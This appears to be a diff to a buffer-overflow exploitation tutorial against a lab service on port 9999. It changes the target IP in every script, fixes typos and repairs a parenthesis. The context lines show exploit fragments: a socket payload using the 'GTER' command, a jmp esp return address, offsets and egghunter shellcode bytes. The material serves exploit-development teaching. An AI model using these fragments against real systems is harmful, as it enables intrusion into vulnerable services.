@@ -81,7 +81,7 @@ Let's create a PoC (Proof-of-Concept) file with that information:
 ----
 mport socket
 
-HOST = '192.168.241.1'
+HOST = '192.168.0.29'
 PORT = 9999
 
 PAYLOAD = (
@@ -141,7 +141,7 @@ Let's update the exploit with that pattern:
 ----
 import socket
 
-HOST = '192.168.241.1'
+HOST = '192.168.0.29'
 PORT = 9999
 
 PAYLOAD = (
@@ -177,7 +177,7 @@ byte of our buffer. Let's update the exploit to check the offset:
 ----
 import socket
 
-HOST = '192.168.241.1'
+HOST = '192.168.0.29'
 PORT = 9999
 
 PAYLOAD = (
@@ -226,7 +226,7 @@ Let's update the exploit and replace the four `B` with that address:
 import socket
 import struct
 
-HOST = '192.168.241.1'
+HOST = '192.168.0.29'
 PORT = 9999
 
 PAYLOAD = (
@@ -250,7 +250,7 @@ Great!
 
 But like everything can't be so glorious, we landed on our
 `C` buffer which contains 20 bytes.
-We need to move to the the buffer our `A` buffer which holds
+We need to move to the `A` buffer which holds
 around 144 bytes to work.
 
 == Jump around
@@ -291,7 +291,7 @@ our exploit with that jump:
 import socket
 import struct
 
-HOST = '192.168.241.1'
+HOST = '192.168.0.29'
 PORT = 9999
 
 PAYLOAD = (
@@ -345,8 +345,8 @@ EGGHUNTER += b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
 
 Note that the configured egg is `w00t`. However, to make the
 searching more effective, that egghunter was designed to  look for
-a double instance of that tag, that means `w00tw00t` and run 
-the actual shellcode.
+a double instance of that tag, that means `w00tw00t`.
+This will make the execution of the shellcode more effective.
 
 Let's update our exploit:
 
@@ -356,7 +356,7 @@ Let's update our exploit:
 import socket
 import struct
 
-HOST = '192.168.241.1'
+HOST = '192.168.0.29'
 PORT = 9999
 
 EGGHUNTER =  b""
@@ -367,7 +367,7 @@ EGGHUNTER += b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
 PAYLOAD = (
     b'GTER /.:/' +
     EGGHUNTER +
-    b'A' * (147 - len(EGGHUNTER) +
+    b'A' * (147 - len(EGGHUNTER)) +
     # 625011C7 | FFE4 | jmp esp
     struct.pack('<L', 0x625011C7) +
     # JMP to the start of our buffer
@@ -449,7 +449,7 @@ tag, or the egghunter won't be able to find it!
 import socket
 import struct
 
-HOST = '192.168.241.1'
+HOST = '192.168.0.29'
 PORT = 9999
 
 EGGHUNTER =  b""
